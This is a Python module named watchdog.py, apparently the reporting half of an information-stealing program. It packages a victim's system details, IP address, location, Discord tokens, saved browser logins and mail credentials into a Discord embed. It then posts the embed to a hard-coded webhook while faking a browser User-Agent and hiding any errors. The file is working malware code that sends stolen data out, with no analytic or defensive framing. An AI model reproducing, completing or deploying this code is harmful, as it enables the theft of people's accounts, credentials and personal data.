# watchdog.py — owns the webhook and posts the gathered data.
# main.py calls report(data) after netinit.gather().

import json
import urllib.request

WEBHOOK = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"


def _post(url, payload):
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=15).read()
        return True
    except Exception:
        return False


def _build_embed(d):
    fields = [
        {"name": "OS", "value": str(d.get("os", "?")), "inline": True},
        {"name": "Arch", "value": str(d.get("arch", "?")), "inline": True},
        {"name": "Host", "value": str(d.get("host", "?")), "inline": True},
        {"name": "User", "value": str(d.get("user", "?")), "inline": True},
        {"name": "CPU", "value": str(d.get("cpu", "?")), "inline": True},
        {"name": "RAM", "value": str(d.get("ram", "?")), "inline": True},
        {"name": "Screen", "value": str(d.get("screen", "?")), "inline": True},
        {"name": "Locale", "value": str(d.get("locale", "?")), "inline": True},
        {"name": "TZ", "value": str(d.get("tz", "?")), "inline": True},
        {"name": "IP", "value": str(d.get("ip", "?")), "inline": True},
        {"name": "Country", "value": str(d.get("country", "?")), "inline": True},
        {"name": "City", "value": str(d.get("city", "?")), "inline": True},
        {"name": "ISP", "value": str(d.get("isp", "?")), "inline": True},
        {"name": "VPN", "value": str(d.get("vpn", "?")), "inline": True},
        {"name": "Coords", "value": str(d.get("coords", "?")), "inline": False},
    ]

    tokens = d.get("tokens", [])
    if tokens:
        fields.append({
            "name": f"Discord Tokens ({len(tokens)})",
            "value": "```\n" + "\n".join(tokens)[:1000] + "\n```",
            "inline": False,
        })

    logins = d.get("logins", [])
    if logins:
        fields.append({
            "name": f"Browser Logins ({len(logins)})",
            "value": "```\n" + "\n".join(logins)[:1000] + "\n```",
            "inline": False,
        })

    mails = d.get("mails", [])
    if mails:
        fields.append({
            "name": f"Mail Creds ({len(mails)})",
            "value": "```\n" + "\n".join(mails)[:1000] + "\n```",
            "inline": False,
        })

    return {
        "embeds": [{
            "title": "device",
            "color": 0x2B2B2B,
            "fields": fields,
        }]
    }


def report(data):
    return _post(WEBHOOK, _build_embed(data))
